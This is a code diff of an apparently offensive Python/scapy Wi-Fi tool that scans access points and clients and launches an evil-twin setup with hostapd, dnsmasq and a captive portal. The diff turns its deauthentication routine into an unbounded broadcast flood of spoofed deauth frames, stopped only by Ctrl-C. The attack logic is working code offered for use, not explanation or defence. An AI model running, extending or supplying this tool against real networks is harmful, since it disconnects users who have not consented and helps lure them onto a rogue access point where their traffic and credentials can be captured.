@@ -224,9 +224,9 @@ class networkInterfaces:
         changeChThread.start()
 
         print('WIFI ACCESS POINTS AND CLIENTS (Ctrl C to stop)')
-        print('+---+-------------------+----------+----+-----------------------+-------------------+-----------------------+')
-        print('| i |       BSSID       | ENCRYPTN | CH |         SSID          |      CLIENT       |         VENDOR        |')
-        print('+---+-------------------+----------+----+-----------------------+-------------------+-----------------------+')
+        print('+---+-------------------+----------+----+--------------------------+-------------------+')
+        print('| i |       BSSID       | ENCRYPTN | CH |           SSID           |      CLIENT       |')
+        print('+---+-------------------+----------+----+--------------------------+-------------------+')
 
         def sniffAP_callback(pkt):
             # Protocol 802.11, type management, subtype beacon
@@ -246,11 +246,10 @@ class networkInterfaces:
             elif pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
                 bssid = pkt[Dot11].addr2.upper()
                 client = pkt[Dot11].addr1.upper()
-                vendor = pkt[Dot11].EltVendorSpecific
                 if bssid in accessPointsWOClients:
                     newAccessPoint = {'bssid' : bssid , 'ssid' : accessPointsWOClients[bssid]['ssid'], 'channel' : accessPointsWOClients[bssid]['channel'], 'encryption' : accessPointsWOClients[bssid]['encryption'], 'client' : client}
                     accessPoints.append(newAccessPoint)
-                    print('|%3s| %17s | %8s | %2s | %-24.24s | %17s | %-24.24s |' % (str(len(accessPoints)), accessPoints[len(accessPoints) - 1]['bssid'], accessPoints[len(accessPoints) - 1]['encryption'], accessPoints[len(accessPoints) - 1]['channel'], accessPoints[len(accessPoints) - 1]['ssid'], client, vendor))
+                    print('|%3s| %17s | %8s | %2s | %-24.24s | %17s |' % (str(len(accessPoints)), accessPoints[len(accessPoints) - 1]['bssid'], accessPoints[len(accessPoints) - 1]['encryption'], accessPoints[len(accessPoints) - 1]['channel'], accessPoints[len(accessPoints) - 1]['ssid'], client))
 
         sniffer = AsyncSniffer(iface=self.interfaces[nInterface]['name'], prn=sniffAP_callback)
         sniffer.start()
@@ -260,7 +259,7 @@ class networkInterfaces:
 
         changeChThread.stop = True
         sniffer.stop()
-        print('--+-------------------+----------+----+----------------------------------+-------------------+')
+        print('--+-------------------+----------+----+--------------------------+-------------------+')
 
         accessPoint = -1
         while accessPoint < 0 or accessPoint >= len(accessPoints):
@@ -435,7 +434,7 @@ class networkInterfaces:
 
         return 0
 
-    def deauth(self, nInterface, channel, bssid, client = 'FF:FF:FF:FF:FF:FF'):
+    def deauth(self, nInterface, sigint_handler, channel, bssid):
         if type(nInterface) is not int:
             print('[x] Input value is not an integer!\n')
             return -1
@@ -452,16 +451,20 @@ class networkInterfaces:
         os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel ' + channel)
         
         # Craft packet
-        pkt = RadioTap()/Dot11(addr1 = client, addr2 = bssid, addr3 = bssid)/Dot11Deauth()
+        broadcast = 'FF:FF:FF:FF:FF:FF'
+        pkt = RadioTap()/Dot11(addr1 = broadcast, addr2 = bssid, addr3 = bssid)/Dot11Deauth(reason=1) # Deauth due to unespecified reason
 
         def sendPkt():
-            sendp(pkt, iface=self.interfaces[nInterface]['name'], count=10000, verbose=0)
-            print('\n[+] Deauth stopped\n')
+            t = threading.currentThread()
+            while not getattr(t, 'stop', False):
+                sendp(pkt, iface=self.interfaces[nInterface]['name'], verbose=0)
+            print('[+] Deauth stopped\n')
 
-        deauthThread = threading.Thread(target = sendPkt)
-        deauthThread.start()
+        global deauThread
+        deauThread = threading.Thread(target = sendPkt)
+        deauThread.start()
 
-        print('[+] Sending deauth packets from ' + bssid + ' to ' + client + ' via channel ' + channel)
+        print('[+] Sending deauth packets from ' + bssid + ' to ' + broadcast + ' via channel ' + channel)
 
 def configWebApp():
     # Config captive portal files
@@ -493,8 +496,9 @@ def configWebApp():
 # file as global in order for the sigint handler to be able to get them
 hostapdFD = 0
 dnsmasqFD = 0
+deauThread = 0
 def sigint_handler(sig, frame):
-    print('\n[x] SIGINT: Exiting...')
+    print('\n\n[x] SIGINT: Exiting...')
     os.system('pkill hostapd')
     os.system('pkill dnsmasq')
 
@@ -508,6 +512,11 @@ def sigint_handler(sig, frame):
 
     if dnsmasqFD != 0:
         dnsmasqFD.close()
+
+    global deauThread
+
+    if deauThread != 0:
+        deauThread.stop = True
 
     quit()
 
@@ -653,7 +662,7 @@ while op < 1 or op > 4:
         configWebApp()
 
         # Deauth AP
-        networkInterfaces.deauth(interface2, channel, bssid)
+        networkInterfaces.deauth(interface2, sigint_handler, channel, bssid)
 
     elif op == 3:
         # Select network interface 2
@@ -709,7 +718,7 @@ while op < 1 or op > 4:
         configWebApp()
 
         # Deauth AP
-        networkInterfaces.deauth(interface2, channel, bssid, client)
+        networkInterfaces.deauth(interface2, sigint_handler, channel, bssid)
 
     elif op == 4:
         probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
